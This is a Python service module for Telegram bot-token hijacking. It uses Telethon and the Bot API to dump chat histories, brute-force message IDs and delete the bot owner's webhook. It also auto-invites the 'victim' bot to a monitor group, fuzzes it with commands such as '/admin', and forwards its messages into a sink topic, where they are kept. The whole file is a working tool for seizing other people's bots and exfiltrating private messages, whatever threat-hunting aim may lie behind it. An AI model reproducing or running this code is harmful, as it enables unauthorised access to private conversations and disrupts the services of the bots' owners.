from typing import List, Dict, Optional
import asyncio
from telethon import TelegramClient, errors
from telethon.tl.types import Message, MessageMediaPhoto, MessageMediaDocument
from app.core.config import settings
import logging
import httpx

logger = logging.getLogger("scraper")

class ScraperService:
    def __init__(self):
        self.api_id = settings.TELEGRAM_API_ID
        self.api_hash = settings.TELEGRAM_API_HASH

    async def scrape_history(self, bot_token: str, chat_id: int, limit: int = 3000) -> List[Dict]:
        """
        Attempts to scrape chat history.
        Strategy 1: Telethon (GetHistory) - Best for deep history. Often restricted.
        Strategy 2: ID Bruteforce (GetMessages) - Uses finding from Strategy 3 to scan backwards.
        Strategy 3: Bot API (getUpdates) - Fallback. Finds recent IDs (needed for Strat 2).
        """
        # Pre-flight: Ensure bot is a member of the target chat
        if not self.is_monitor_bot(bot_token):
            await self._ensure_bot_in_chat(bot_token, chat_id)

        scraped_messages = []
        unique_ids = set()
        
        # Strategy 1: Telethon (GetHistory)
        try:
            try:
                telethon_msgs = await self._scrape_via_telethon(bot_token, chat_id, limit)
                for m in telethon_msgs:
                    if m['telegram_msg_id'] not in unique_ids:
                        scraped_messages.append(m)
                        unique_ids.add(m['telegram_msg_id'])
                
                if len(scraped_messages) > 10: # If we got a decent amount, likely success
                    logger.info(f"✨ [Scraper] Telethon normal dump success: {len(scraped_messages)} messages.")
                    return scraped_messages
            except errors.FloodWaitError as e:
                logger.warning(f"    🛑 [Scraper] Telethon FloodWait: Sleeping {e.seconds}s...")
                await asyncio.sleep(e.seconds)
        except Exception as e:
            # Check for common "ChatAdminRequired" or "ChatWriteForbidden"
            err_str = str(e)
            if "ChatAdminRequired" in err_str:
                logger.warning("    ⚠️ [Scraper] Telethon Restriction: Bot needs Admin to read history here.")
            elif "API access for bot users is restricted" in err_str:
                 logger.warning("    ⚠️ [Scraper] Telethon Restriction: Bot Privacy Mode is ON (Expected). Falling back to Strategies 2 & 3...")
            else:
                logger.warning(f"    ⚠️ [Scraper] Telethon history dump failed: {e}")

        # Get 'Anchor' ID from Bot API (Strategy 3) to enable Strategy 2
        anchor_id = 0
        try:
            api_msgs = await self._scrape_via_bot_api(bot_token)
            for m in api_msgs:
                # Add these finding too
                if m['telegram_msg_id'] not in unique_ids:
                    # Filter for checking chat_id if we have one?
                    # Bot API getUpdates is global, so we check if it matches target chat
                    # OR if target chat is unknown, we take all? 
                    # Here we target specific chat_id.
                    if str(m.get('chat_id')) == str(chat_id):
                        scraped_messages.append(m)
                        unique_ids.add(m['telegram_msg_id'])
                        if m['telegram_msg_id'] > anchor_id:
                            anchor_id = m['telegram_msg_id']
            logger.info(f"    [Scraper] Found anchor ID {anchor_id} from Bot API.")
        except Exception as e:
            logger.warning(f"    [Scraper] Bot API fallback failed: {e}")

        # KICKSTART: If bot is dormant (Anchor 0), we must wake it up to get an ID.
        if anchor_id == 0:
            anchor_id = await self._kickstart_bot(bot_token)

        # Strategy 3: Blind ID Bruteforce (Telethon GetMessages)
        # If we found an anchor, we can look backwards!
        if anchor_id > 0:
            try:
                logger.info(f"🔨 [Scraper] Attempting Blind ID Bruteforce from ID {anchor_id} downwards...")
                brute_msgs = await self._scrape_via_id_bruteforce(bot_token, chat_id, anchor_id, limit=500)
                for m in brute_msgs:
                    if m['telegram_msg_id'] not in unique_ids:
                        scraped_messages.append(m)
                        unique_ids.add(m['telegram_msg_id'])
                logger.info(f"✨ [Scraper] Bruteforce added {len(brute_msgs)} messages.")
            except Exception as e:
                logger.error(f"❌ [Scraper] Bruteforce failed: {e}")

        # Strategy 4: Blind Forwarding (Matkap Style)
        # Extremely powerful but invasive. Use if brute force yielded nothing.
        if len(scraped_messages) == 0 and anchor_id > 0:
             try:
                # We need a destination. Use MONITOR_GROUP_ID if set.
                dest_chat_id = settings.MONITOR_GROUP_ID
                if dest_chat_id:
                     logger.info(f"🚀 [Scraper] Engaging Matkap-Style Forwarding (Target: {dest_chat_id})...")
                     
                     # AUTO-INVITE: Use User Agent to add bot to group
                     try:
                         from app.services.user_agent_srv import user_agent
                         # We need the username. We might have it from earlier or need to fetch it.
                         # We can try to get it from cache or just rely on what we know.
                         # If we don't have the username, we can't invite easily by username.
                         # But wait, we have the BOT TOKEN. We can get its username!
                         async with httpx.AsyncClient() as client:
                             me_res = await client.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5)
                             if me_res.status_code == 200:
                                 data = me_res.json()
                                 if data.get("ok"):
                                     victim_username = data["result"]["username"]
                                     logger.info(f"    [Scraper] Auto-inviting @{victim_username} to monitor group...")
                                     
                                     # CLEANUP: Remove other bots first (as requested)
                                     whitelist = [x.strip() for x in settings.WHITELISTED_BOT_IDS.split(",") if x.strip()]
                                     if whitelist:
                                         await user_agent.cleanup_bots(dest_chat_id, whitelist)
                                         
                                     await user_agent.invite_bot_to_group(victim_username, dest_chat_id)
                     except Exception as e_invite:
                         logger.warning(f"    ⚠️ [Scraper] Auto-invite failed (skipping): {e_invite}")

                     fwd_msgs = await self._scrape_via_forwarding(bot_token, chat_id, dest_chat_id, anchor_id, limit=20)
                     for m in fwd_msgs:
                        if m['telegram_msg_id'] not in unique_ids:
                            scraped_messages.append(m)
                            unique_ids.add(m['telegram_msg_id'])
                     logger.info(f"✨ [Scraper] Forwarding added {len(fwd_msgs)} messages.")
             except Exception as e:
                 logger.error(f"❌ [Scraper] Forwarding failed: {e}")

        return scraped_messages

    async def _create_forum_topic(self, bot_token: str, chat_id: int, name: str) -> int:
        """Helper to create a forum topic using a bot."""
        try:
            url = f"https://api.telegram.org/bot{bot_token}/createForumTopic"
            async with httpx.AsyncClient() as client:
                res = await client.post(url, json={"chat_id": chat_id, "name": name}, timeout=10)
                if res.status_code == 200:
                    data = res.json()
                    if data.get("ok"):
                        return data["result"]["message_thread_id"]
        except Exception as e:
            logger.warning(f"    ⚠️ Topic create failed: {e}")
        return 0

    async def _scrape_via_forwarding(self, bot_token: str, from_chat_id: int, to_chat_id: int, start_id: int, limit: int) -> List[Dict]:
        """
        Matkap-style: Forces bot to forward messages to a sink chat (Forum Topic).
        1. Creates a topic: '💀 @bot_username'
        2. Forwards messages there.
        3. KEEPS them there (no delete).
        """
        import time
        from app.core.config import settings
        
        msgs = []
        base_url = f"https://api.telegram.org/bot{bot_token}"

        async with httpx.AsyncClient() as client:
            # 0. Get Bot Info for Topic Name
            bot_username = "unknown_bot"
            bot_id = "0"
            try:
                me_res = await client.get(f"{base_url}/getMe", timeout=5)
                if me_res.status_code == 200:
                    data = me_res.json()
                    if data.get("ok"):
                        bot_username = data["result"].get("username", "unknown")
                        bot_id = str(data["result"].get("id", "0"))
            except: pass

            # 2. Create Topic (using Hunter Bot) with correct naming convention
            target_thread_id = 0
            if settings.bot_tokens:
                topic_name = f"@{bot_username} / {bot_id}"
                logger.info(f"    [Scraper] Creating topic '{topic_name}'...")
                target_thread_id = await self._create_forum_topic(settings.bot_tokens[0], to_chat_id, topic_name)
            
            if not target_thread_id:
                 logger.warning("    [Scraper] Could not create topic (check permissions/forum mode). Forwarding to 'General'...")

            # Scan backwards from start_id
            for msg_id in range(start_id, max(0, start_id - limit), -1):
                try:
                    # 2. Forward
                    payload = {
                        "chat_id": to_chat_id,
                        "from_chat_id": from_chat_id,
                        "message_id": msg_id
                    }
                    if target_thread_id:
                        payload["message_thread_id"] = target_thread_id

                    res = await client.post(f"{base_url}/forwardMessage", json=payload, timeout=5)
                    
                    if res.status_code == 200:
                        data = res.json()
                        if data.get("ok"):
                            result = data["result"]
                            
                            # Parse Content
                            content = result.get('text') or result.get('caption') or ""
                            
                            media_type = "text"
                            file_meta = {}
                            if 'photo' in result: media_type = 'photo'
                            elif 'document' in result: media_type = 'document'
                            
                            original_sender = "Unknown"
                            if 'forward_from' in result:
                                original_sender = result['forward_from'].get('username') or result['forward_from'].get('first_name')
                            
                            msgs.append({
                                "telegram_msg_id": msg_id,
                                "sender_name": original_sender,
                                "content": content,
                                "media_type": media_type,
                                "file_meta": file_meta,
                                "chat_id": from_chat_id
                            })
                            
                            # 3. NO DELETE - User wants to keep them!
                            
                            await asyncio.sleep(0.2) # Rate limit safety
                            
                    elif res.status_code == 429:
                        logger.warning("    Rate limit hit, sleeping...")
                        await asyncio.sleep(2)
                except Exception:
                    pass
                
        return msgs

    async def _scrape_via_id_bruteforce(self, bot_token: str, chat_id: int, start_id: int, limit: int) -> List[Dict]:
        """
        Fetches messages by ID batches (GetMessages) instead of listing history (GetHistory).
        Bypasses 'API restricted' error for listing history.
        """
        from app.services.bot_manager_srv import bot_manager
        msgs = []
        try:
            client = await bot_manager.get_client(bot_token)
            
            # Create batches of IDs to check
            # Scan backwards from start_id
            # e.g. 1000 IDs total
            ids_to_check = []
            for i in range(start_id, max(0, start_id - limit), -1):
                ids_to_check.append(i)
            
            # Chunk into 100s
            chunk_size = 100
            for i in range(0, len(ids_to_check), chunk_size):
                batch = ids_to_check[i:min(i + chunk_size, len(ids_to_check))]
                try:
                    # Request specific IDs
                    found = await client.get_messages(chat_id, ids=batch)
                    
                    for message in found:
                        if not message or not isinstance(message, Message): continue
                        
                        content = message.text or ""
                        media_type = "text"
                        file_meta = {}

                        if message.media:
                            if isinstance(message.media, MessageMediaPhoto):
                                media_type = "photo"
                                file_meta = {"wc": "photo", "id": getattr(message.media.photo, 'id', 0)}
                            elif isinstance(message.media, MessageMediaDocument):
                                media_type = "document"
                                file_meta = {"mime": message.media.document.mime_type}

                        sender_name = "Unknown"
                        if message.sender:
                            if hasattr(message.sender, 'username') and message.sender.username:
                                sender_name = message.sender.username
                            elif hasattr(message.sender, 'first_name'):
                                sender_name = message.sender.first_name

                        msgs.append({
                            "telegram_msg_id": message.id,
                            "sender_name": sender_name,
                            "content": content,
                            "media_type": media_type,
                            "file_meta": file_meta,
                            "chat_id": chat_id
                        })
                except Exception as e:
                    # print(f"Batch fail: {e}")
                    pass
        except Exception as e:
            logger.error(f"❌ [Scraper] Bruteforce Telethon error: {e}")
        return msgs

    async def _scrape_via_telethon(self, bot_token: str, chat_id: int, limit: int) -> List[Dict]:
        from app.services.bot_manager_srv import bot_manager
        msgs = []
        try:
            # logger.info(f"🔐 [Scraper] Getting shared client for bot...")
            client = await bot_manager.get_client(bot_token)
            
            # 0. Check Redis Cache for known restrictions
            from app.core.redis_srv import redis_srv
            
            # Key format: bot_restricted:{chat_id}
            # If exists, skip Telethon entirely to save time/logs
            if redis_srv.is_on_cooldown(f"bot_restricted:{chat_id}"):
                logger.info(f"    ⏩ [Scraper] Skipping Telethon (Cached Restriction) for Chat {chat_id}. Using UserAgent...")
                from app.services.user_agent_srv import user_agent
                return await user_agent.get_history(chat_id, limit)

            # Pre-check via Bot API to Prevent ApiBotRestrictedError / bans proactively
            async with httpx.AsyncClient(timeout=5.0) as http_client:
                check_res = await http_client.get(f"https://api.telegram.org/bot{bot_token}/getChat", params={"chat_id": chat_id})
                if check_res.status_code in [400, 401, 403]:
                    logger.warning(f"    🛡️ [Scraper] Bot API reports no access (HTTP {check_res.status_code}). Falling back to UserAgent...")
                    redis_srv.set_cooldown(f"bot_restricted:{chat_id}", 21600)
                    from app.services.user_agent_srv import user_agent
                    return await user_agent.get_history(chat_id, limit)

            logger.info(f"📖 [Scraper] Fetching history via Telethon (Limit: {limit})...")
            
            # ATTEMPT 1: Resolve Entity explicitly
            entity = None
            try:
                entity = await asyncio.wait_for(client.get_entity(chat_id), timeout=10.0)
            except (ValueError, asyncio.TimeoutError):
                logger.warning("    ⚠️ [Scraper] Entity not found directly. Refreshing dialogs...")
                try:
                    await asyncio.wait_for(client.get_dialogs(limit=100), timeout=15.0) # Populate cache
                    entity = await asyncio.wait_for(client.get_entity(chat_id), timeout=10.0)
                except Exception as e:
                    logger.error(f"    ❌ [Scraper] Could not resolve entity even after dialog refresh: {e}")
            
            target = entity if entity else chat_id
            
            async def _fetch():
                local_msgs = []
                async for message in client.iter_messages(target, limit=limit):
                    if not isinstance(message, Message): continue
                    
                    content = message.text or ""
                    media_type = "text"
                    file_meta = {}

                    if message.media:
                        if isinstance(message.media, MessageMediaPhoto):
                            media_type = "photo"
                            file_meta = {"wc": "photo", "id": getattr(message.media.photo, 'id', 0)}
                        elif isinstance(message.media, MessageMediaDocument):
                            media_type = "document"
                            file_meta = {"mime": message.media.document.mime_type}
                        else:
                            media_type = "other"

                    sender_name = "Unknown"
                    if message.sender:
                        if hasattr(message.sender, 'username') and message.sender.username:
                            sender_name = message.sender.username
                        elif hasattr(message.sender, 'first_name'):
                            sender_name = message.sender.first_name

                    local_msgs.append({
                        "telegram_msg_id": message.id,
                        "sender_name": sender_name,
                        "content": content,
                        "media_type": media_type,
                        "file_meta": file_meta,
                        "chat_id": chat_id # Ensure we track where it came from
                    })
                return local_msgs
                
            msgs = await asyncio.wait_for(_fetch(), timeout=90.0)
            
        except asyncio.TimeoutError:
             logger.error("    ⏰ [Scraper] Telethon history fetch timed out (asyncio.TimeoutError).")
        except Exception as e:
             err_str = str(e)
             if "API access for bot users is restricted" in err_str or "ChatAdminRequired" in err_str:
                 logger.warning(f"    🛡️ [Scraper] Bot Restricted ({err_str}). Falling back to UserAgent...")
                 try:
                     redis_srv.set_cooldown(f"bot_restricted:{chat_id}", 21600)
                 except: pass # Non-critical if Redis fails
                 
                 from app.services.user_agent_srv import user_agent
                 return await user_agent.get_history(chat_id, limit)
             
             logger.error(f"❌ [Scraper] Telethon history error: {e}")
        return msgs

    def is_monitor_bot(self, token: str) -> bool:
        """
        Robustly checks if a token belongs to the system monitor bot.
        Strips whitespace and compares Bot IDs (prefix before colon) to prevent conflicts.
        """
        if not token or not settings.bot_tokens:
            return False
            
        clean_token = token.strip()
        
        for monitor_token in settings.bot_tokens:
            clean_monitor = monitor_token.strip()
            
            # 1. Exact match (after stripping)
            if clean_token == clean_monitor:
                return True
                
            # 2. ID-based match
            if ":" in clean_token and ":" in clean_monitor:
                id_token = clean_token.split(":")[0]
                id_monitor = clean_monitor.split(":")[0]
                if id_token == id_monitor:
                    return True
                    
        return False

    async def _ensure_bot_in_chat(self, bot_token: str, chat_id: int) -> bool:
        """
        Checks if the bot has access to the target chat.
        If not (403/400), attempts to invite it using UserAgent.
        Returns True if bot has access, False otherwise.
        """
        base_url = f"https://api.telegram.org/bot{bot_token}"

        # 1. Check access via Bot API getChat
        try:
            async with httpx.AsyncClient(timeout=10.0) as client:
                res = await client.get(f"{base_url}/getChat", params={"chat_id": chat_id})
                if res.status_code == 200 and res.json().get("ok"):
                    return True  # Bot already has access

                if res.status_code not in [400, 401, 403]:
                    # Unexpected error, don't try to fix
                    logger.warning(f"    ⚠️ [Scraper] getChat returned HTTP {res.status_code}, skipping auto-invite.")
                    return False
        except Exception as e:
            logger.warning(f"    ⚠️ [Scraper] getChat check failed: {e}")
            return False

        # 2. Bot doesn't have access — try to invite it
        logger.info(f"    🚪 [Scraper] Bot not in target chat {chat_id}. Attempting auto-invite...")
        try:
            # Get bot username
            bot_username = None
            async with httpx.AsyncClient(timeout=5.0) as client:
                me_res = await client.get(f"{base_url}/getMe")
                if me_res.status_code == 200:
                    data = me_res.json()
                    if data.get("ok"):
                        bot_username = data["result"].get("username")

            if not bot_username:
                logger.warning("    ⚠️ [Scraper] Could not resolve bot username for invite.")
                return False

            # Check UserAgent cooldown
            from app.core.redis_srv import redis_srv
            if redis_srv.is_on_cooldown("user_agent"):
                ttl = redis_srv.get_cooldown_remaining("user_agent")
                logger.warning(f"    ⏳ [Scraper] Skipping auto-invite: UserAgent on cooldown ({ttl}s left).")
                return False

            from app.services.user_agent_srv import user_agent
            success = await user_agent.invite_bot_to_group(bot_username, chat_id)
            if success:
                logger.info(f"    ✅ [Scraper] Auto-invited @{bot_username} to chat {chat_id}. Waiting for propagation...")
                await asyncio.sleep(3)  # Wait for Telegram to propagate membership
                return True
            else:
                logger.warning(f"    ❌ [Scraper] Auto-invite of @{bot_username} to chat {chat_id} failed.")
                return False

        except Exception as e:
            logger.warning(f"    ⚠️ [Scraper] Auto-invite error: {e}")
            return False

    async def _scrape_via_bot_api(self, bot_token: str) -> List[Dict]:
        """
        Fallback: Use httpx to hit https://api.telegram.org/bot<token>/getUpdates
        If webhook is active, delete it first.
        """
        logger.info(f"🔄 [Scraper] Attempting Bot API getUpdates fallback...")
        
        # Prevent polling our own monitor bot
        if self.is_monitor_bot(bot_token):
            logger.warning(f"    ⏭️ [Scraper] Skipping getUpdates for Monitor Bot to prevent polling conflicts.")
            return []
            
        base_url = f"https://api.telegram.org/bot{bot_token}"
        msgs = []
        
        async with httpx.AsyncClient(timeout=15.0) as client:
            # First attempt
            try:
                res = await client.get(f"{base_url}/getUpdates", params={'limit': 100})
            except Exception as e:
                logger.error(f"    ❌ Bot API Connection Error: {e}")
                return []
            
            # Check for webhook conflict error
            if res.status_code == 409 or (res.status_code == 200 and not res.json().get('ok') and 'webhook' in res.text.lower()):
                logger.warning(f"    ⚠️ [Scraper] Webhook detected, attempting to delete...")
                try:
                    # Delete the webhook
                    del_res = await client.post(f"{base_url}/deleteWebhook")
                    if del_res.status_code == 200 and del_res.json().get('ok'):
                        logger.info(f"    ✅ [Scraper] Webhook deleted successfully!")
                        # Retry getUpdates after deleting webhook
                        await asyncio.sleep(1)  # Brief pause for Telegram to process
                        res = await client.get(f"{base_url}/getUpdates", params={'limit': 100})
                    else:
                        logger.error(f"    ❌ [Scraper] Failed to delete webhook: {del_res.text}")
                except Exception as e:
                    logger.error(f"    ❌ [Scraper] Webhook deletion error: {e}")
            
            if res.status_code == 200:
                data = res.json()
                if data.get('ok'):
                    updates = data.get('result', [])
                    for update in updates:
                        # We care about 'message', 'edited_message', 'channel_post'
                        target = update.get('message') or update.get('channel_post') or update.get('edited_message')
                        if not target: continue
                        
                        chat = target.get('chat', {})
                        sender = target.get('from', {})
                        
                        content = target.get('text') or target.get('caption') or ""
                        
                        # Determine media
                        media_type = "text"
                        file_meta = {}
                        if 'photo' in target:
                            media_type = "photo"
                        elif 'document' in target:
                            media_type = "document"
                            
                        msgs.append({
                            "telegram_msg_id": target.get('message_id'),
                            "sender_name": sender.get('username') or sender.get('first_name') or "Unknown",
                            "content": content,
                            "media_type": media_type,
                            "file_meta": file_meta,
                            "chat_id": chat.get('id')
                        })
                else:
                    logger.error(f"    ❌ Bot API Error: {res.text}")
            else:
                 logger.error(f"    ❌ Bot API HTTP Error: {res.status_code}")
            
        return msgs

    async def discover_chats(self, bot_token: str) -> (Dict, List[Dict]):
        """
        Validates a bot token and discovers chats using Telegram Bot API.
        Returns: (bot_info, discovered_chats)
        """
        base_url = f"https://api.telegram.org/bot{bot_token}"
        discovered_chats = []
        bot_info = {}
        
        # Prevent discovering/kickstarting our own monitor bot
        is_monitor_bot = self.is_monitor_bot(bot_token)
        
        try:
            logger.info(f"🔍 [Discovery] Validating token {bot_token[:15]}... via Bot API")
            
            async with httpx.AsyncClient(timeout=15.0) as client:
                # Step 1: Validate token with getMe
                try:
                    me_res = await client.get(f"{base_url}/getMe")
                except Exception as e:
                    logger.error(f"    ❌ Connection failed: {e}")
                    return {}, []

                if me_res.status_code != 200:
                     logger.info(f"    ❌ Token invalid or revoked (HTTP {me_res.status_code})")
                     return {}, []
                
                me_data = me_res.json()
                if not me_data.get('ok'):
                    logger.info(f"    ❌ Token invalid or revoked")
                    return {}, []
                
                bot_info = me_data.get('result', {})
                logger.info(f"    ✅ Token valid! Bot: @{bot_info.get('username', 'unknown')}")
                
                # Step 2: Get recent chats from getUpdates
                try:
                    if is_monitor_bot:
                        logger.info(f"    ⏭️ [Discovery] Skipping getUpdates for Monitor Bot.")
                        updates_res = type('obj', (object,), {'status_code': 200, 'json': lambda: {'ok': True, 'result': []}})()
                    else:
                        updates_res = await client.get(f"{base_url}/getUpdates", params={'limit': 100})
                    
                    # Check for webhook conflict (409)
                    if updates_res.status_code == 409 or (updates_res.status_code == 200 and not updates_res.json().get('ok') and 'webhook' in updates_res.text.lower()):
                         logger.warning(f"    ⚠️ [Discovery] Webhook detected (409), attempting to delete...")
                         try:
                             del_res = await client.post(f"{base_url}/deleteWebhook")
                             if del_res.status_code == 200 and del_res.json().get('ok'):
                                 logger.info(f"    ✅ [Discovery] Webhook deleted successfully! Retrying...")
                                 await asyncio.sleep(1)
                                 updates_res = await client.get(f"{base_url}/getUpdates", params={'limit': 100})
                             else:
                                 logger.error(f"    ❌ [Discovery] Failed to delete webhook: {del_res.text}")
                         except Exception as e:
                             logger.error(f"    ❌ [Discovery] Webhook deletion error: {e}")

                except Exception as e:
                     logger.warning(f"    ⚠️ Failed to fetch updates: {e}")
                     # Return just bot info if updates fail
                     return bot_info, []

                if updates_res.status_code == 200:
                    updates_data = updates_res.json()
                    if updates_data.get('ok'):
                        updates = updates_data.get('result', [])
                        
                        # Extract unique chats from updates
                        seen_chats = set()
                        for update in updates:
                            # Check message, edited_message, channel_post, etc.
                            for key in ['message', 'edited_message', 'channel_post', 'edited_channel_post', 'my_chat_member', 'chat_member']:
                                if key in update:
                                    chat = update[key].get('chat', {})
                                    chat_id = chat.get('id')
                                    if chat_id and chat_id not in seen_chats:
                                        seen_chats.add(chat_id)
                                        chat_type = chat.get('type', 'unknown')
                                        chat_name = chat.get('title') or chat.get('username') or chat.get('first_name') or str(chat_id)
                                        
                                        discovered_chats.append({
                                            "id": chat_id,
                                            "name": chat_name,
                                            "type": chat_type
                                        })
                                        logger.info(f"    📍 Found Chat: {chat_name} (ID: {chat_id}, Type: {chat_type})")
                        
                        # If no updates but token is valid, use bot's own ID as fallback
                        if not discovered_chats:
                            # Token works but no recent activity - still valid!
                            # Use a placeholder to indicate token is valid but no chats found
                            logger.info(f"    ℹ️ Token valid but no recent chat activity")
                            # Return bot info as a "chat" so validation passes
                            discovered_chats.append({
                                "id": bot_info.get('id'),
                                "name": f"@{bot_info.get('username', 'bot')} (Bot Self)",
                                "type": "bot_self"
                            })
                
                logger.info(f"🏁 [Discovery] Found {len(discovered_chats)} chat(s) for this bot.")
            
        except httpx.TimeoutException:
            logger.warning(f"    ⚠️ Telegram API timeout")
        except Exception as e:
            logger.error(f"Error discovering chats: {e}")
            
        # PROACTIVE KICKSTART: If discovery yielded nothing, try to wake the bot up.
        if not discovered_chats and bot_info.get('username'):
             if is_monitor_bot:
                 logger.info("    ℹ️ [Discovery] Monitor bot is dormant, but skipping kickstart to prevent loops.")
             else:
                 logger.info("💤 [Discovery] Bot seems dormant. Initiating Kickstart sequence to create a chat...")
                 new_anchor = await self._kickstart_bot(bot_token)
                 if new_anchor > 0:
                     # If kickstart worked, we should have at least one update now.
                     # We can't easily get the chat ID without re-running discovery, 
                     # OR we can just return the bot itself as a "chat" and let the next scrape cycle handle it.
                     # IMPROVEMENT: Let's re-run discovery one last time? 
                     # For now, let's just let the next cycle pick it up, but return the Bot Self so it's not removed.
                     logger.info("    ✅ [Discovery] Kickstart successful. Updates should be available next cycle.")
                     discovered_chats.append({
                        "id": bot_info.get('id'),
                        "name": f"@{bot_info.get('username', 'bot')} (Kickstarted)",
                        "type": "bot_self"
                     })

        return bot_info, discovered_chats

    async def _kickstart_bot(self, bot_token: str) -> int:
        """
        Invites the bot to the Monitor Group and sends commands to generate a Service Message / Update.
        Returns the new 'anchor' message ID if successful, else 0.
        """
        if self.is_monitor_bot(bot_token):
             logger.warning("    ⏭️ [Scraper] Skipping kickstart for the Monitor Bot itself.")
             return 0

        logger.info("💤 [Scraper] Initiating Kickstart...")
        anchor_id = 0
        try:
            from app.services.user_agent_srv import user_agent
            import time

            # 1. Get Username (needed for invite)
            bot_username = "unknown"
            async with httpx.AsyncClient() as client:
                me_res = await client.get(f"https://api.telegram.org/bot{bot_token}/getMe", timeout=5)
                if me_res.status_code == 200:
                    data = me_res.json()
                    if data.get("ok"):
                        bot_username = data["result"]["username"]
            
            # 2. Invite to Group (Creates a Service Message -> New ID!)
            dest = settings.MONITOR_GROUP_ID
            if dest and bot_username != "unknown":
                from app.core.redis_srv import redis_srv
                if redis_srv.is_on_cooldown("user_agent"):
                     ttl = redis_srv.get_cooldown_remaining("user_agent")
                     logger.warning(f"    ⏳ [Scraper] Skipping Kickstart: UserAgent is on cooldown ({ttl}s left).")
                     return 0

                logger.info(f"    ⚡ [Scraper] Kickstarting: Inviting @{bot_username} to monitor group...")
                if await user_agent.invite_bot_to_group(bot_username, dest):
                        logger.info("    ⏳ [Scraper] Invite sent. Starting Command Fuzzing...")
                        
                        # === TRIGGER COMMAND FUZZING ===
                        params = ["/start", "/help", "/admin", "/config", "dashboard"]
                        for cmd in params:
                            await user_agent.send_message(dest, cmd)
                            await asyncio.sleep(1.5) # Pace out commands
                        
                        logger.info("    ⏳ [Scraper] Fuzzing complete. Waiting for bot response...")
                        await asyncio.sleep(5) 
                        # ===============================
                        
                        # 3. Re-Poll Updates
                        retry_msgs = await self._scrape_via_bot_api(bot_token)
                        for m in retry_msgs:
                            if m['telegram_msg_id'] > anchor_id:
                                anchor_id = m['telegram_msg_id']
                        
                        if anchor_id > 0:
                            logger.info(f"    ✅ [Scraper] Kickstart successful! New Anchor ID: {anchor_id}")
                        else:
                            logger.warning("    ❌ [Scraper] Kickstart failed (No update received).")
        except Exception as e:
            logger.error(f"    ⚠️ [Scraper] Kickstart error: {e}")
        
        return anchor_id

    async def attempt_orphan_match(self, token: str, known_chat_ids: List[int]) -> Optional[int]:
        """
        [DEPRECATED/DISABLED]
        Try to match a token to a known chat ID by checking visibility (getChat).
        Returns None immediately to save rate limits.
        """
        # Feature disabled by user request to prevent rate limiting.
        return None

scraper_service = ScraperService()
